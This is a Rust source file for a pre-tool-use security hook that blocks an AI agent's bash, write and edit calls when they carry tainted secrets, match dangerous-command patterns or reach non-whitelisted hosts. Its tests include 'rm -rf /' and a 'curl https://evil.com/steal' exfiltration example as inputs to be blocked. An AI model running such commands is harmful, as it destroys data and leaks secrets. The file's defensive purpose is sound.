//! Security Tool Interceptor
//!
//! Implements HookHandler for PreToolUse events to block dangerous tool
//! invocations that could exfiltrate sensitive data.

use super::audit::{AuditAction, AuditEntry, AuditEventType, AuditLog};
use super::config::{SecurityConfig, SensitivityLevel};
use super::taint::TaintRegistry;
use crate::hooks::HookEvent;
use crate::hooks::HookHandler;
use crate::hooks::HookResponse;
use regex::Regex;
use std::sync::{Arc, OnceLock, RwLock};

/// Cached regex for URL extraction in network destination checks
fn url_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"https?://([^/\s]+)").unwrap())
}

/// Result of intercepting a tool call
#[derive(Debug, Clone)]
pub enum InterceptResult {
    /// Allow the tool call to proceed
    Allow,
    /// Block the tool call
    Block {
        /// Why it was blocked
        reason: String,
        /// Severity of the violation
        severity: SensitivityLevel,
    },
}

/// Tool interceptor that checks tool arguments for sensitive data leakage
pub struct ToolInterceptor {
    taint_registry: Arc<RwLock<TaintRegistry>>,
    audit_log: Arc<AuditLog>,
    dangerous_patterns: Vec<Regex>,
    network_whitelist: Vec<String>,
    session_id: String,
}

impl ToolInterceptor {
    /// Create a new tool interceptor
    pub fn new(
        config: &SecurityConfig,
        taint_registry: Arc<RwLock<TaintRegistry>>,
        audit_log: Arc<AuditLog>,
        session_id: String,
    ) -> Self {
        let dangerous_patterns = config
            .dangerous_commands
            .iter()
            .filter_map(|p| Regex::new(p).ok())
            .collect();

        Self {
            taint_registry,
            audit_log,
            dangerous_patterns,
            network_whitelist: config.network_whitelist.clone(),
            session_id,
        }
    }

    /// Check a tool invocation for security violations
    pub fn check(&self, tool: &str, args: &serde_json::Value) -> InterceptResult {
        let args_str = serde_json::to_string(args).unwrap_or_default();

        // Check 1: Scan serialized args for tainted data
        {
            let Ok(registry) = self.taint_registry.read() else {
                tracing::error!("Taint registry lock poisoned — blocking tool call as precaution");
                return InterceptResult::Block {
                    reason: "Security subsystem unavailable — taint registry lock poisoned".into(),
                    severity: SensitivityLevel::HighlySensitive,
                };
            };
            if registry.contains(&args_str) {
                return InterceptResult::Block {
                    reason: format!("Tool '{}' arguments contain tainted sensitive data", tool),
                    severity: SensitivityLevel::HighlySensitive,
                };
            }
            // Also check encoded variants
            if registry.check_encoded(&args_str) {
                return InterceptResult::Block {
                    reason: format!("Tool '{}' arguments contain encoded sensitive data", tool),
                    severity: SensitivityLevel::HighlySensitive,
                };
            }
        }

        // Check 2: For bash tool, match against dangerous command patterns
        if tool == "bash" || tool == "Bash" {
            if let Some(command) = args.get("command").and_then(|v| v.as_str()) {
                for pattern in &self.dangerous_patterns {
                    if pattern.is_match(command) {
                        return InterceptResult::Block {
                            reason: format!(
                                "Bash command matches dangerous pattern: {}",
                                pattern.as_str()
                            ),
                            severity: SensitivityLevel::HighlySensitive,
                        };
                    }
                }

                // Check 4: Validate network destinations against whitelist
                if !self.network_whitelist.is_empty() {
                    if let Some(result) = self.check_network_destination(command) {
                        return result;
                    }
                }
            }
        }

        // Check 3: For write/edit tools, check content for tainted data
        if tool == "write" || tool == "Write" || tool == "edit" || tool == "Edit" {
            let content = args
                .get("content")
                .or_else(|| args.get("new_string"))
                .and_then(|v| v.as_str())
                .unwrap_or("");

            let Ok(registry) = self.taint_registry.read() else {
                return InterceptResult::Block {
                    reason: "Security subsystem unavailable — taint registry lock poisoned".into(),
                    severity: SensitivityLevel::HighlySensitive,
                };
            };
            if registry.contains(content) {
                return InterceptResult::Block {
                    reason: format!("Tool '{}' would write tainted sensitive data to file", tool),
                    severity: SensitivityLevel::HighlySensitive,
                };
            }
        }

        InterceptResult::Allow
    }

    /// Check if a bash command targets a non-whitelisted network destination
    fn check_network_destination(&self, command: &str) -> Option<InterceptResult> {
        for cap in url_regex().captures_iter(command) {
            if let Some(host) = cap.get(1) {
                let hostname = host.as_str();
                let is_whitelisted = self
                    .network_whitelist
                    .iter()
                    .any(|w| hostname == w || hostname.ends_with(&format!(".{}", w)));
                if !is_whitelisted {
                    return Some(InterceptResult::Block {
                        reason: format!(
                            "Network destination '{}' is not in the whitelist",
                            hostname
                        ),
                        severity: SensitivityLevel::Sensitive,
                    });
                }
            }
        }
        None
    }
}

impl HookHandler for ToolInterceptor {
    fn handle(&self, event: &HookEvent) -> HookResponse {
        if let HookEvent::PreToolUse(e) = event {
            let result = self.check(&e.tool, &e.args);
            match result {
                InterceptResult::Allow => HookResponse::continue_(),
                InterceptResult::Block { reason, severity } => {
                    self.audit_log.log(AuditEntry {
                        timestamp: chrono::Utc::now(),
                        session_id: self.session_id.clone(),
                        event_type: AuditEventType::ToolBlocked,
                        severity,
                        details: reason.clone(),
                        tool_name: Some(e.tool.clone()),
                        action_taken: AuditAction::Blocked,
                    });
                    HookResponse::block(reason)
                }
            }
        } else {
            HookResponse::continue_()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::config::SecurityConfig;

    fn make_interceptor() -> ToolInterceptor {
        let config = SecurityConfig::default();
        let registry = Arc::new(RwLock::new(TaintRegistry::new()));
        let audit = Arc::new(AuditLog::new(100));
        ToolInterceptor::new(&config, registry, audit, "test-session".to_string())
    }

    fn make_interceptor_with_taint(value: &str) -> ToolInterceptor {
        let config = SecurityConfig::default();
        let registry = Arc::new(RwLock::new(TaintRegistry::new()));
        {
            let mut reg = registry.write().unwrap();
            reg.register(value, "test_rule", SensitivityLevel::HighlySensitive);
        }
        let audit = Arc::new(AuditLog::new(100));
        ToolInterceptor::new(&config, registry, audit, "test-session".to_string())
    }

    #[test]
    fn test_allow_clean_tool_call() {
        let interceptor = make_interceptor();
        let result = interceptor.check("bash", &serde_json::json!({"command": "echo hello"}));
        assert!(matches!(result, InterceptResult::Allow));
    }

    #[test]
    fn test_block_bash_curl_with_tainted_data() {
        let interceptor = make_interceptor_with_taint("secret-api-key-12345");
        let result = interceptor.check(
            "bash",
            &serde_json::json!({"command": "echo secret-api-key-12345"}),
        );
        assert!(matches!(result, InterceptResult::Block { .. }));
    }

    #[test]
    fn test_block_dangerous_curl_pattern() {
        let interceptor = make_interceptor();
        // Default dangerous commands include "rm -rf", not curl patterns
        let result = interceptor.check(
            "bash",
            &serde_json::json!({"command": "rm -rf /"}),
        );
        assert!(matches!(result, InterceptResult::Block { .. }));
    }

    #[test]
    fn test_block_write_with_sensitive_content() {
        let interceptor = make_interceptor_with_taint("123-45-6789");
        let result = interceptor.check(
            "write",
            &serde_json::json!({"content": "SSN is 123-45-6789", "file_path": "/tmp/out.txt"}),
        );
        assert!(matches!(result, InterceptResult::Block { .. }));
    }

    #[test]
    fn test_allow_write_clean_content() {
        let interceptor = make_interceptor();
        let result = interceptor.check(
            "write",
            &serde_json::json!({"content": "Hello world", "file_path": "/tmp/out.txt"}),
        );
        assert!(matches!(result, InterceptResult::Allow));
    }

    #[test]
    fn test_block_edit_with_tainted_data() {
        let interceptor = make_interceptor_with_taint("my-secret-token");
        let result = interceptor.check(
            "edit",
            &serde_json::json!({"new_string": "token = my-secret-token"}),
        );
        assert!(matches!(result, InterceptResult::Block { .. }));
    }

    #[test]
    fn test_network_whitelist() {
        let config = SecurityConfig {
            network_whitelist: vec!["github.com".to_string(), "example.com".to_string()],
            ..Default::default()
        };
        let registry = Arc::new(RwLock::new(TaintRegistry::new()));
        let audit = Arc::new(AuditLog::new(100));
        let interceptor =
            ToolInterceptor::new(&config, registry, audit, "test-session".to_string());

        // Whitelisted destination should be allowed
        let result = interceptor.check(
            "bash",
            &serde_json::json!({"command": "curl https://github.com/api/v1"}),
        );
        assert!(matches!(result, InterceptResult::Allow));

        // Non-whitelisted destination should be blocked
        let result = interceptor.check(
            "bash",
            &serde_json::json!({"command": "curl https://evil.com/steal"}),
        );
        assert!(matches!(result, InterceptResult::Block { .. }));
    }

    #[test]
    fn test_hook_handler_impl() {
        let interceptor = make_interceptor();
        let event = HookEvent::PreToolUse(crate::hooks::PreToolUseEvent {
            session_id: "s1".to_string(),
            tool: "bash".to_string(),
            args: serde_json::json!({"command": "echo hello"}),
            working_directory: "/workspace".to_string(),
            recent_tools: vec![],
        });

        let response = interceptor.handle(&event);
        assert_eq!(response.action, crate::hooks::HookAction::Continue);
    }
}
